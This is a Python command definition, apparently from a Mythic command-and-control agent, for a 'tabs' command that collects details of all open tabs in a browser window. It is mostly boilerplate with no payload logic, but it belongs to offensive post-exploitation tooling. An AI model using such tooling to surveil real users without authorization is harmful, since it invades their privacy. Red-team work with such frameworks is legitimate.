import json

from mythic_payloadtype_container.MythicCommandBase import *


class TabsArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {}

    async def parse_arguments(self):
        pass


class TabsCommand(CommandBase):
    cmd = "tabs"
    needs_admin = False
    help_cmd = "tabs"
    description = "Retrieve information about all open tabs in the current window"
    version = 1
    author = "@xorrior"
    argument_class = TabsArguments
    browser_script = [BrowserScript(script_name="tabs_parser", author="@sysop_host")]
    attackmapping = []

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, response: AgentResponse):
        pass
